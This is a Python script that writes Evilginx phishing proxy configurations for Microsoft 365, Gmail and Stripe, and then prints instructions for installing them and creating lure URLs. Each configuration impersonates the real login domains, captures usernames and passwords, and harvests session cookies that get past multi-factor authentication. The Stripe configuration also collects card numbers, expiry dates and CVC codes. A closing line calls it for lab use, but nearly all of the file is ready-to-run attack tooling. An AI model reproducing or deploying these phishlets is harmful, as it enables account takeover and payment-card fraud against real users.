#!/usr/bin/env python3
"""
Evilginx Phishlet Generator
Generates Evilginx phishlet configurations for use with the templates
"""

import os
import sys
from pathlib import Path

# Color codes for terminal output
class Colors:
    HEADER = '\033[95m'
    BLUE = '\033[94m'
    CYAN = '\033[96m'
    GREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    END = '\033[0m'
    BOLD = '\033[1m'

def print_header(text):
    print(f"\n{Colors.HEADER}{Colors.BOLD}{'='*60}{Colors.END}")
    print(f"{Colors.HEADER}{Colors.BOLD}{text.center(60)}{Colors.END}")
    print(f"{Colors.HEADER}{Colors.BOLD}{'='*60}{Colors.END}\n")

def print_success(text):
    print(f"{Colors.GREEN}✓ {text}{Colors.END}")

def generate_microsoft365_phishlet(output_dir):
    """Generate Microsoft 365 phishlet"""

    phishlet = """name: 'microsoft365'
author: 'gophish-labs'
min_ver: '2.3.0'

proxy_hosts:
  - {phish_sub: 'login', orig_sub: 'login', domain: 'microsoftonline.com', session: true, is_landing: true}
  - {phish_sub: 'www', orig_sub: 'www', domain: 'office.com', session: true, is_landing: false}
  - {phish_sub: 'outlook', orig_sub: 'outlook', domain: 'office.com', session: true, is_landing: false}

sub_filters:
  - triggers_on: ['login.microsoftonline.com']
    orig_sub: 'login'
    domain: 'microsoftonline.com'
    search: 'login.microsoftonline.com'
    replace: '{domain}'
    mimes: ['text/html', 'application/json', 'application/javascript']

  - triggers_on: ['www.office.com']
    orig_sub: 'www'
    domain: 'office.com'
    search: 'www.office.com'
    replace: '{domain}'
    mimes: ['text/html', 'application/json']

auth_tokens:
  - domain: '.office.com'
    keys: ['ESTSAUTH', 'ESTSAUTHPERSISTENT', 'SignInStateCookie']

  - domain: '.microsoftonline.com'
    keys: ['ESTSAUTH', 'ESTSAUTHPERSISTENT']

credentials:
  username:
    key: 'login'
    search: '(.*)'
    type: 'post'
  password:
    key: 'passwd'
    search: '(.*)'
    type: 'post'

login:
  url: '/'

js_inject:
  - trigger_domains: ['login.microsoftonline.com']
    trigger_paths: ['/common/oauth2/authorize']
    script: |
      // Capture additional form data
      (function() {
        var forms = document.getElementsByTagName('form');
        for(var i = 0; i < forms.length; i++) {
          forms[i].addEventListener('submit', function(e) {
            console.log('Form submitted');
          });
        }
      })();
"""

    output_path = Path(output_dir) / "microsoft365.yaml"
    with open(output_path, 'w') as f:
        f.write(phishlet)

    print_success(f"Generated: {output_path}")

def generate_gmail_phishlet(output_dir):
    """Generate Gmail phishlet"""

    phishlet = """name: 'gmail'
author: 'gophish-labs'
min_ver: '2.3.0'

proxy_hosts:
  - {phish_sub: 'accounts', orig_sub: 'accounts', domain: 'google.com', session: true, is_landing: true}
  - {phish_sub: 'mail', orig_sub: 'mail', domain: 'google.com', session: true, is_landing: false}
  - {phish_sub: 'www', orig_sub: 'www', domain: 'google.com', session: false, is_landing: false}

sub_filters:
  - triggers_on: ['accounts.google.com']
    orig_sub: 'accounts'
    domain: 'google.com'
    search: 'accounts.google.com'
    replace: '{domain}'
    mimes: ['text/html', 'application/json', 'application/javascript']

  - triggers_on: ['mail.google.com']
    orig_sub: 'mail'
    domain: 'google.com'
    search: 'mail.google.com'
    replace: '{domain}'
    mimes: ['text/html', 'application/json']

auth_tokens:
  - domain: '.google.com'
    keys: ['SID', 'SSID', 'HSID', 'APISID', 'SAPISID', '__Secure-1PSID', '__Secure-3PSID']

credentials:
  username:
    key: 'identifier'
    search: '(.*)'
    type: 'post'
  password:
    key: 'password'
    search: '(.*)'
    type: 'post'

login:
  url: '/signin/v2/identifier'

force_post: []
"""

    output_path = Path(output_dir) / "gmail.yaml"
    with open(output_path, 'w') as f:
        f.write(phishlet)

    print_success(f"Generated: {output_path}")

def generate_stripe_phishlet(output_dir):
    """Generate Stripe phishlet"""

    phishlet = """name: 'stripe'
author: 'gophish-labs'
min_ver: '2.3.0'

proxy_hosts:
  - {phish_sub: 'dashboard', orig_sub: 'dashboard', domain: 'stripe.com', session: true, is_landing: true}
  - {phish_sub: 'api', orig_sub: 'api', domain: 'stripe.com', session: false, is_landing: false}
  - {phish_sub: 'js', orig_sub: 'js', domain: 'stripe.com', session: false, is_landing: false}

sub_filters:
  - triggers_on: ['dashboard.stripe.com']
    orig_sub: 'dashboard'
    domain: 'stripe.com'
    search: 'dashboard.stripe.com'
    replace: '{domain}'
    mimes: ['text/html', 'application/json', 'application/javascript']

  - triggers_on: ['api.stripe.com']
    orig_sub: 'api'
    domain: 'stripe.com'
    search: 'api.stripe.com'
    replace: '{domain}'
    mimes: ['application/json']

auth_tokens:
  - domain: '.stripe.com'
    keys: ['session', 'machine_identifier', '__stripe_mid']

credentials:
  username:
    key: 'email'
    search: '(.*)'
    type: 'post'
  password:
    key: 'password'
    search: '(.*)'
    type: 'post'
  custom:
    - key: 'cardNumber'
      search: '(.*)'
      type: 'post'
    - key: 'expiry'
      search: '(.*)'
      type: 'post'
    - key: 'cvc'
      search: '(.*)'
      type: 'post'
    - key: 'cardName'
      search: '(.*)'
      type: 'post'

login:
  url: '/login'

force_post: ['/login']
"""

    output_path = Path(output_dir) / "stripe.yaml"
    with open(output_path, 'w') as f:
        f.write(phishlet)

    print_success(f"Generated: {output_path}")

def main():
    """Main function"""

    print_header("Evilginx Phishlet Generator")

    # Create output directory
    script_dir = Path(__file__).parent.parent
    output_dir = script_dir / "templates" / "evilginx-configs"
    output_dir.mkdir(parents=True, exist_ok=True)

    print(f"{Colors.CYAN}Generating phishlets in: {output_dir}{Colors.END}\n")

    # Generate phishlets
    generate_microsoft365_phishlet(output_dir)
    generate_gmail_phishlet(output_dir)
    generate_stripe_phishlet(output_dir)

    print_header("Generation Complete!")
    print(f"{Colors.CYAN}Phishlets generated: {len(list(output_dir.glob('*.yaml')))}{Colors.END}")
    print(f"\n{Colors.WARNING}⚠ Installation Instructions:{Colors.END}")
    print(f"{Colors.CYAN}1. Copy .yaml files to your Evilginx phishlets directory:")
    print(f"   cp {output_dir}/*.yaml /path/to/evilginx/phishlets/{Colors.END}")
    print(f"\n{Colors.CYAN}2. In Evilginx, enable the phishlets:")
    print(f"   phishlets hostname <phishlet> <your-domain>")
    print(f"   phishlets enable <phishlet>{Colors.END}")
    print(f"\n{Colors.CYAN}3. Create lures:")
    print(f"   lures create <phishlet>")
    print(f"   lures get-url <lure-id>{Colors.END}")
    print(f"\n{Colors.GREEN}For educational lab use only!{Colors.END}")

if __name__ == "__main__":
    main()
